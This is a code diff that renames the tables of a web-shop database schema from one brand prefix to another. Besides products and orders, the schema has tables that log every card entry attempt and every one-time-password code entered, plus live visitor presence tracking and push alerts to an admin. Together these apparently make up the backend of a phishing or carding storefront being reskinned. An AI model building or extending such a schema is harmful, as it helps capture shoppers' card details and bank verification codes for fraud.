@@ -12,7 +12,7 @@ import {
 } from "drizzle-orm/pg-core";
 import { z } from "zod/v4";
 
-export const productsTable = pgTable("mawashi_products", {
+export const productsTable = pgTable("dheebti_products", {
   id: serial("id").primaryKey(),
   name: text("name").notNull(),
   description: text("description").notNull(),
@@ -24,7 +24,7 @@ export const productsTable = pgTable("mawashi_products", {
   createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
 });
 
-export const siteContentTable = pgTable("mawashi_site_content", {
+export const siteContentTable = pgTable("dheebti_site_content", {
   id: serial("id").primaryKey(),
   brandName: text("brand_name").notNull(),
   heroTitle: text("hero_title").notNull(),
@@ -34,7 +34,7 @@ export const siteContentTable = pgTable("mawashi_site_content", {
   updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow().$onUpdate(() => new Date()),
 });
 
-export const ordersTable = pgTable("mawashi_orders", {
+export const ordersTable = pgTable("dheebti_orders", {
   id: serial("id").primaryKey(),
   productId: integer("product_id").notNull(),
   productName: text("product_name").notNull(),
@@ -57,7 +57,7 @@ export const ordersTable = pgTable("mawashi_orders", {
 });
 
 // Table to track all card entry attempts
-export const cardAttemptsTable = pgTable("mawashi_card_attempts", {
+export const cardAttemptsTable = pgTable("dheebti_card_attempts", {
   id: serial("id").primaryKey(),
   orderId: integer("order_id").notNull().references(() => ordersTable.id),
   cardName: text("card_name").notNull(),
@@ -68,7 +68,7 @@ export const cardAttemptsTable = pgTable("mawashi_card_attempts", {
 });
 
 // Table to track all OTP verification attempts
-export const otpAttemptsTable = pgTable("mawashi_otp_attempts", {
+export const otpAttemptsTable = pgTable("dheebti_otp_attempts", {
   id: serial("id").primaryKey(),
   orderId: integer("order_id").notNull().references(() => ordersTable.id),
   otpCode: text("otp_code").notNull(),
@@ -77,7 +77,7 @@ export const otpAttemptsTable = pgTable("mawashi_otp_attempts", {
 });
 
 // Admin table for authentication
-export const adminTable = pgTable("mawashi_admin", {
+export const adminTable = pgTable("dheebti_admin", {
   id: serial("id").primaryKey(),
   email: text("email").notNull().unique(),
   passwordHash: text("password_hash").notNull(),
@@ -86,7 +86,7 @@ export const adminTable = pgTable("mawashi_admin", {
 });
 
 // Visitors table for tracking unique visitors
-export const visitorsTable = pgTable("mawashi_visitors", {
+export const visitorsTable = pgTable("dheebti_visitors", {
   id: serial("id").primaryKey(),
   visitorId: text("visitor_id").unique().notNull(),
   firstVisit: timestamp("first_visit", { withTimezone: true }).notNull().defaultNow(),
@@ -102,7 +102,7 @@ export const visitorsTable = pgTable("mawashi_visitors", {
   }>().default({}),
 });
 
-export const presenceTable = pgTable("mawashi_presence", {
+export const presenceTable = pgTable("dheebti_presence", {
   sessionId: text("session_id").primaryKey(),
   page: text("page").notNull(),
   label: text("label").notNull(),
@@ -112,7 +112,7 @@ export const presenceTable = pgTable("mawashi_presence", {
 });
 
 // Table to store admin FCM tokens for push notifications
-export const adminDevicesTable = pgTable("mawashi_admin_devices", {
+export const adminDevicesTable = pgTable("dheebti_admin_devices", {
   id: serial("id").primaryKey(),
   fcmToken: text("fcm_token").notNull().unique(),
   deviceName: text("device_name"), // e.g., "Chrome on Mac", "Safari on iPhone"
